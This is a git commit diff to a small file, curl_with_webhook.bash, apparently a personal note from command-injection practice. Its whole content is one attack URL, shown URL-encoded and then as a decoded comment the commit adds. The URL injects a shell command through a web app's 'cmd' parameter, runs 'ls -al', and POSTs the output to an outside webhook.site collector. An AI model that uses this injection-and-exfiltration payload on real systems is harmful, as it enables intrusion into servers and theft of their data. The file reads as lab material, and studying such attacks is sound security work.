1b6713991bc4d0d2cf42b094c4732b4521a6d722
w4ynott <102636722+w4ynott@users.noreply.github.com>
2022-03-31 14:52:28 +0900

    Update curl_with_webhook.bash

--- curl_with_webhook.bash
+++ curl_with_webhook.bash
@@ -1,1 +1,2 @@
 http://localhost:8000/?cmd=curl%20-X%20POST%20-d%20"$(ls%20-al)"%20https://webhook.site/uniq_seq/
+# http://localhost:8000/?cmd=curl -X POST -d "$(ls -al)" https://webhook.site/uniq_seq/
